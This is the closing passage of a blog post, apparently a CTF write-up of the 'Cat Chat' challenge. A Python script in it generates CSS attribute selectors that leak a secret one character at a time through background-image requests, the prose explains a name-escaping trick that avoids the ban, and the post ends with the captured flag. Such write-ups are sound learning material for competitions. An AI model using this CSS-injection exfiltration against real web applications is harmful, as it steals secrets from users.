<div class="sourceLine" id="5" href="#5" data-line-number="5"><span class="cf">for</span> c <span class="kw">in</span> string.ascii_letters <span class="op">+</span> string.digits <span class="op">+</span> <span class="st">&quot;-_&quot;</span>:</div>
<div class="sourceLine" id="6" href="#6" data-line-number="6">    prefix <span class="op">=</span> known_prefix <span class="op">+</span> c</div>
<div class="sourceLine" id="7" href="#7" data-line-number="7">    ret.append(<span class="st">&quot;span[data-secret^=CTF</span><span class="ch">\\</span><span class="st">7B </span><span class="sc">{}</span><span class="st">]</span><span class="sc">{{</span><span class="st">background-image:url(send?name=</span><span class="sc">{}</span><span class="st">&amp;amp;msg=</span><span class="sc">{}</span><span class="st">);</span><span class="sc">}}</span><span class="st">&quot;</span>.<span class="bu">format</span>(prefix, c, c))</div>
<div class="sourceLine" id="8" href="#8" data-line-number="8">ret.append(<span class="st">&quot;a[id=a&quot;</span>)</div>
<div class="sourceLine" id="9" href="#9" data-line-number="9"><span class="bu">print</span>(<span class="st">&#39;&#39;</span>.join(ret))</div></code></pre>
<p>There are two more things we haven’t seen here. The first (which I didn’t know until doing this challenge) is the <code>\7B</code>, which is an escaped <code>{</code>. In <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/string">CSS strings</a> you can escape charaters with a backslash followed by the character’s codepoint in hexadecimal and then, if necessary, a space to delimit. The second is a final optimization, which I didn’t realize until after the CTF: if you just replace <code>&amp;</code> with <code>&amp;amp;</code> in your name, it will be stored verbatim as your name, but will get unescaped when displayed in the browser. As a result, the admin’s helper function will see your name as the version with only <code>&amp;</code> instead of <code>&amp;amp;</code>, and will attempt to ban that nonexistent user. The rest of the exploit works exactly the same, except that you won’t be banned and won’t even need to bother with blocking or deleting cookies.</p>
<figure>
<img src="/img/cat-chat-1.png" alt="Obtaining the first character after CTF" /><figcaption>Obtaining the first character after <code>CTF</code></figcaption>
</figure>
<p>This could probably be automated further, but it is kind of annoying to hook into the existing code for receiving messages and I was not sure if it would start getting caught by the CAPTCHA, so I was content to copy characters and commands back and forth between my browser and my terminal a dozen or so times. Repeating this process obtains the flag:</p>
<pre><code>CTF{L0LC47S_43V3R}</code></pre></article>
	<footer class="post-footer">
		
		<ul class="post-tags">
			
			<li><a href="/tag/ctf"><span class="tag">CTF</span></a></li>
			
		</ul>
		
	</footer>
	<script data-isso="//node.vero.site/isso/" data-isso-css="false" src="//node.vero.site/isso/js/embed.min.js"></script>
	<section id="isso-thread"></section>
	<p class="comments-meta">(note: the commenting setup here is experimental and I may not check my comments often; if you want to tell <em>me</em> something instead of the world, email me!)</p>
	
	
	
	<footer class="post-footer">
		<nav class="pagination">
			
			<a class="pagination-previous" href="//blog.vero.site/post/js-safe-2">← JS Safe 2.0</a>
			
			
			<a class="pagination-next" href="//blog.vero.site/post/proprietary-format">Proprietary Format →</a>
			
		</nav>
	</footer>
</section>
<footer class="site-footer">
	<p>© 2017-2018 betaveros, Bounded-Error Log</p>
	<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />Except where otherwise noted, content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
	<p>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="http://pandoc.org/">pandoc</a>,
	<a href="https://posativ.org/isso/">Isso</a>,
	<a href="https://pages.github.com/">GitHub Pages</a>, and
	<a href="https://www.cloudflare.com/">CloudFlare</a>.
	</p>
</footer>


<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>

<script src="/katex/katex.min.js"></script>
<script src="/katex/contrib/auto-render.min.js"></script>
<script>renderMathInElement(document.body);</script>
<script src="/js/bundle.js"></script>
<script src="/js/jquery-3.2.1.min.js"></script>



  </div></body>
</html>
